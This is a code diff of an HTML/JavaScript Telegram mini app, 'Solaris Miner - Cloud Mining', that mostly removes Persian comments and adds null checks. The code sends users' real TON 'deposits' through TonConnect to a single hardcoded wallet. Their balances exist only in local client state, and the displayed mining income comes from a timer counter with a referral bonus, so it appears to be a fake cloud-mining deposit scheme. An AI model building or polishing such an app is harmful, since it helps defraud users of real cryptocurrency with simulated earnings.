@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Solaris Miner - Cloud Mining</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- اضافه کردن کتابخانه TonConnect UI برای اتصال امن و اتوماتیک به Tonkeeper -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         * {
@@ -99,7 +98,6 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.2);
         }
 
-        /* کارت بزرگ فضایی با کهکشان و ستاره‌های چشمک‌زن */
         .space-mining-card {
             position: relative;
             background: linear-gradient(rgba(11, 15, 25, 0.65), rgba(11, 15, 25, 0.85)), url('https://images.unsplash.com/photo-1506703719100-a0f3a48c0f86?auto=format&fit=crop&w=800&q=80') center/cover no-repeat;
@@ -359,7 +357,6 @@
             border: 1px solid rgba(255,255,255,0.2);
         }
 
-        /* جایگاه دکمه رسمی TonConnect در بخش ولت */
         #ton-connect-button-container {
             display: flex;
             justify-content: center;
@@ -535,19 +532,19 @@
                 </div>
             </div>
 
-            <div class="friends-collect-card">
+            <div class="friends-collect-card" style="display: flex; justify-content: space-between; align-items: center; background: rgba(30, 41, 59, 0.7); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; padding: 16px; margin-bottom: 14px;">
                 <div>
                     <div style="font-size: 11px; color: #94a3b8;">Ready to collect</div>
                     <div style="font-size: 20px; font-weight: bold; color: #ffffff; margin-top: 2px;" id="friend-reward-display">0.00 <span style="font-size: 11px; color: #38bdf8;">TON</span></div>
                 </div>
-                <button class="wallet-action-btn" style="background: #0098ea; color: #fff; padding: 10px 20px;" onclick="collectFriendReward()">Collect</button>
+                <button class="wallet-action-btn" style="background: #0098ea; color: #fff; padding: 10px 20px; flex: unset;" onclick="collectFriendReward()">Collect</button>
             </div>
 
             <div class="wallet-menu-box" style="flex-direction: column; align-items: flex-start; gap: 8px;">
                 <div style="font-size: 11px; color: #94a3b8;">Your invitation link</div>
                 <div style="display: flex; width: 100%; gap: 8px;">
                     <input type="text" class="wallet-input" id="ref-link-input" readonly style="margin-top: 0; flex: 1;">
-                    <button class="wallet-action-btn" style="background: rgba(30,41,59,0.9); color: #38bdf8; padding: 0 16px; font-size: 12px;" onclick="shareRefLink()">Share Direct</button>
+                    <button class="wallet-action-btn" style="background: rgba(30,41,59,0.9); color: #38bdf8; padding: 0 16px; font-size: 12px; flex: unset;" onclick="shareRefLink()">Share Direct</button>
                 </div>
             </div>
 
@@ -579,7 +576,6 @@
                 </div>
             </div>
 
-            <!-- دکمه رسمی اتصال کیف پول TonConnect (برای اتصال امن Tonkeeper) -->
             <div id="ton-connect-button-container"></div>
 
             <div class="wallet-menu-box" onclick="alert('Deposit history is empty.')">
@@ -709,10 +705,8 @@
     </div>
 
     <script>
-        // آدرس ولت شما به عنوان گیرنده تراکنش‌ها
         const recipientWalletAddress = "UQB9Q80VvzlJSFsfGBA6IO1Yh3UMcGJfGyNmq3PejlPIdR9v";
         
-        // راه‌اندازی TonConnect UI با آدرس دقیق مانیفست اختصاصی پروژه‌تان در گیت‌هاب
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://radintoken-dotcom.github.io/solaris-miner/tonconnect-manifest.json',
             uiPreferences: {
@@ -720,7 +714,6 @@
             }
         });
 
-        // رندر کردن دکمه TonConnect در صفحه ولت
         window.addEventListener('DOMContentLoaded', () => {
             tonConnectUI.uiOptions = {
                 buttonRootId: 'ton-connect-button-container'
@@ -787,6 +780,7 @@
         function renderProperties() {
             const container = document.getElementById('properties-list');
             const myContainer = document.getElementById('my-miners-list');
+            if (!container || !myContainer) return;
             container.innerHTML = '';
             myContainer.innerHTML = '';
 
@@ -796,7 +790,7 @@
                     <div class="property-card ${isOwned ? 'active-miner' : ''}">
                         <div class="property-badge" style="${isOwned ? 'background:rgba(0,152,234,0.2); color:#38bdf8;' : ''}">${isOwned ? '⚡ Active' : item.label}</div>
                         <img src="${item.img}" class="missile-img" alt="${item.name}">
-                        <div class="property-title">🚀 ${item.name}</div>
+                        <div class="property-title">${item.name}</div>
                         <div class="property-desc">${item.desc}</div>
                         
                         <div class="property-grid">
@@ -822,7 +816,7 @@
                     const myHtml = `
                         <div class="property-card active-miner" style="text-align:left;">
                             <img src="${item.img}" class="missile-img" style="height:110px;" alt="${item.name}">
-                            <div class="property-title" style="color:#38bdf8;">🚀 ${item.name}</div>
+                            <div class="property-title" style="color:#38bdf8;">${item.name}</div>
                             <div class="property-desc">Mining Speed: +${item.daily.toFixed(2)} TON / day</div>
                         </div>
                     `;
@@ -860,7 +854,6 @@
             alert("✅ Rewards successfully added to your balance!");
         }
 
-        // ارسال تراکنش واقعی از طریق TonConnect به کیف پول کاربر (Tonkeeper)
         async function sendTonConnectTransaction() {
             if (!tonConnectUI.connected) {
                 alert("❌ Please connect your wallet first using the Connect Wallet button!");
@@ -871,7 +864,7 @@
             const nanoTon = Math.floor(amountInput * 1000000000).toString();
 
             const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes
+                validUntil: Math.floor(Date.now() / 1000) + 600,
                 messages: [
                     {
                         address: recipientWalletAddress,
@@ -884,7 +877,6 @@
                 alert("🚀 Opening your Tonkeeper to confirm deposit...");
                 const result = await tonConnectUI.sendTransaction(transaction);
                 
-                // اگر تراکنش موفق بود، موجودی کاربر در ربات شارژ میشه
                 state.balance += amountInput;
                 state.totalDeposited += amountInput;
                 saveState();
@@ -936,32 +928,49 @@
         }
 
         function updateUI() {
-            document.getElementById('user-balance').innerText = state.balance.toFixed(8) + ' TON';
-            document.getElementById('wallet-balance-display').innerText = state.balance.toFixed(8) + ' TON';
-            document.getElementById('live-unclaimed').innerText = state.unclaimed.toFixed(8);
-            document.getElementById('mined-rate-sub').innerText = `≈ +${getTotalDailyRate().toFixed(2)} TON daily rate`;
-            
-            document.getElementById('owned-count').innerText = state.ownedIds.length + " / 12 Active";
-            document.getElementById('total-daily').innerText = "+" + getTotalDailyRate().toFixed(2) + " TON";
+            const userBalanceEl = document.getElementById('user-balance');
+            const walletBalanceEl = document.getElementById('wallet-balance-display');
+            const liveUnclaimedEl = document.getElementById('live-unclaimed');
+            const minedRateSubEl = document.getElementById('mined-rate-sub');
+            const ownedCountEl = document.getElementById('owned-count');
+            const totalDailyEl = document.getElementById('total-daily');
+            const friendRewardEl = document.getElementById('friend-reward-display');
+            const friendCountEl = document.getElementById('friend-count');
+            const friendEarnedEl = document.getElementById('friend-earned');
+            const friendDepositsEl = document.getElementById('friend-deposits');
+            const profileUserNameEl = document.getElementById('profile-user-name');
+            const profileUserIdEl = document.getElementById('profile-user-id');
+            const profileTotalDepositedEl = document.getElementById('profile-total-deposited');
+            const profileTotalWithdrawnEl = document.getElementById('profile-total-withdrawn');
+            const profileImgEl = document.getElementById('profile-img');
 
-            document.getElementById('friend-reward-display').innerText = state.friendReward.toFixed(2);
-            document.getElementById('friend-count').innerText = state.friendCount;
-            document.getElementById('friend-earned').innerText = state.friendEarned.toFixed(2);
-            document.getElementById('friend-deposits').innerText = state.friendDeposits.toFixed(2);
-
-            document.getElementById('profile-user-name').innerText = state.userName;
-            document.getElementById('profile-user-id').innerText = state.telegramId;
-            document.getElementById('profile-total-deposited').innerText = state.totalDeposited.toFixed(2);
-            document.getElementById('profile-total-withdrawn').innerText = state.totalWithdrawn.toFixed(2);
+            if (userBalanceEl) userBalanceEl.innerText = state.balance.toFixed(8) + ' TON';
+            if (walletBalanceEl) walletBalanceEl.innerText = state.balance.toFixed(8) + ' TON';
+            if (liveUnclaimedEl) liveUnclaimedEl.innerText = state.unclaimed.toFixed(8);
+            if (minedRateSubEl) minedRateSubEl.innerText = `≈ +${getTotalDailyRate().toFixed(2)} TON daily rate`;
             
-            if (state.photoUrl) {
-                document.getElementById('profile-img').src = state.photoUrl;
+            if (ownedCountEl) ownedCountEl.innerText = state.ownedIds.length + " / 12 Active";
+            if (totalDailyEl) totalDailyEl.innerText = "+" + getTotalDailyRate().toFixed(2) + " TON";
+
+            if (friendRewardEl) friendRewardEl.innerText = state.friendReward.toFixed(2);
+            if (friendCountEl) friendCountEl.innerText = state.friendCount;
+            if (friendEarnedEl) friendEarnedEl.innerText = state.friendEarned.toFixed(2);
+            if (friendDepositsEl) friendDepositsEl.innerText = state.friendDeposits.toFixed(2);
+
+            if (profileUserNameEl) profileUserNameEl.innerText = state.userName;
+            if (profileUserIdEl) profileUserIdEl.innerText = state.telegramId;
+            if (profileTotalDepositedEl) profileTotalDepositedEl.innerText = state.totalDeposited.toFixed(2);
+            if (profileTotalWithdrawnEl) profileTotalWithdrawnEl.innerText = state.totalWithdrawn.toFixed(2);
+            
+            if (state.photoUrl && profileImgEl) {
+                profileImgEl.src = state.photoUrl;
             }
         }
 
         setInterval(() => {
             state.unclaimed += getTotalDailyRate() / 86400;
-            document.getElementById('live-unclaimed').innerText = state.unclaimed.toFixed(8);
+            const liveUnclaimedEl = document.getElementById('live-unclaimed');
+            if (liveUnclaimedEl) liveUnclaimedEl.innerText = state.unclaimed.toFixed(8);
             saveState();
         }, 1000);
 
@@ -970,25 +979,32 @@
                 alert("⚠️ Please connect your Tonkeeper wallet first using the Connect Wallet button!");
                 return;
             }
-            document.getElementById('deposit-modal').style.display = 'flex';
+            const modal = document.getElementById('deposit-modal');
+            if (modal) modal.style.display = 'flex';
         }
 
         function openWithdrawModal() {
-            document.getElementById('withdraw-amount').value = '';
-            document.getElementById('withdraw-address').value = '';
-            document.getElementById('withdraw-modal').style.display = 'flex';
+            const amtEl = document.getElementById('withdraw-amount');
+            const addrEl = document.getElementById('withdraw-address');
+            const modal = document.getElementById('withdraw-modal');
+            if (amtEl) amtEl.value = '';
+            if (addrEl) addrEl.value = '';
+            if (modal) modal.style.display = 'flex';
         }
 
         function closeModal(modalId) {
-            document.getElementById(modalId).style.display = 'none';
+            const modal = document.getElementById(modalId);
+            if (modal) modal.style.display = 'none';
         }
 
         function switchTab(tabName) {
             document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
 
-            document.getElementById('tab-' + tabName).classList.add('active');
-            document.getElementById('nav-' + tabName).classList.add('active');
+            const targetTab = document.getElementById('tab-' + tabName);
+            const targetNav = document.getElementById('nav-' + tabName);
+            if (targetTab) targetTab.classList.add('active');
+            if (targetNav) targetNav.classList.add('active');
         }
 
         function shareRefLink() {
@@ -1013,7 +1029,8 @@
                 }
             } catch(e) {}
 
-            document.getElementById('ref-link-input').value = "https://t.me/SolarisMiner_bot?start=" + state.telegramId;
+            const refInput = document.getElementById('ref-link-input');
+            if (refInput) refInput.value = "https://t.me/SolarisMiner_bot?start=" + state.telegramId;
             saveState();
             renderProperties();
         };
